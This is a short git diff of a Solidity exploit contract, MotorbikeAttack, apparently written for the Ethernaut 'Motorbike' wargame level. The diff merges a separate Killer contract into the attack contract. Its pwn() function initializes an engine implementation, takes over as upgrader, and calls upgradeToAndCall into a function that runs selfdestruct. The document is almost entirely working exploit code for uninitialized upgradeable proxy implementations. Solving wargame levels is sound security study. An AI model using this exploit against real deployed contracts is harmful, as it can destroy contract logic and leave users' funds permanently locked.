@@ -9,21 +9,22 @@ interface IEngine {
         payable;
 }
 
-contract Killer {
-    event Destruct(address);
-
-    function kill() public {
-        emit Destruct(address(this));
-        selfdestruct(payable(address(0)));
-    }
-}
-
 contract MotorbikeAttack {
-    constructor(address engine, address killer) public {
+    IEngine engine;
+
+    constructor(address _engine) public {
+        engine = IEngine(_engine);
+    }
+
+    function pwn() external {
         IEngine(engine).initialize();
         IEngine(engine).upgradeToAndCall(
-            killer,
-            abi.encodeWithSelector(Killer.kill.selector)
+            address(this),
+            abi.encodeWithSelector(this.kill.selector)
         );
+    }
+
+    function kill() external {
+        selfdestruct(payable(address(0)));
     }
 }
